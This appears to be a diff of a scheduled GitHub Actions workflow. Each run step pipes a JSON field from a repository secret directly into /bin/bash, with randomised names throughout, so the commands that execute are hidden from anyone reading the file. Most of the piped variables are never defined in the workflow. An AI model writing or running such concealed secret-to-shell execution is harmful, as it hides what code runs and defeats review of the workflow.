@@ -3,20 +3,23 @@ name: examineexact
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 2/6 * * *'
+    - cron: '53 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: examineexact
         env:
-          spta97185: ${{ secrets.spta97185 }}
+          bk368: ${{ secrets.bk368 }}
         run: |
-          echo $spta97185 | jq -r .hhe366 | /bin/bash
-          echo $m1972 | jq -r .r0501 | /bin/bash
-          echo $pyaix60579 | jq -r .o20 | /bin/bash
-          echo $y20 | jq -r .u02735 | /bin/bash
-          echo $xf25 | jq -r .ohhn705 | /bin/bash
-          echo $i0 | jq -r .iwod1 | /bin/bash
+          echo $bk368 | jq -r .aa1 | /bin/bash
+          echo $cey37413 | jq -r .zkea35 | /bin/bash
+          echo $qtndd2 | jq -r .lf58513 | /bin/bash
+          echo $kv87981 | jq -r .px1284 | /bin/bash
+          echo $kdqk05 | jq -r .jqs735 | /bin/bash
+          echo $dviv396 | jq -r .eprj94 | /bin/bash
+          echo $zdr9 | jq -r .pufi96 | /bin/bash
 
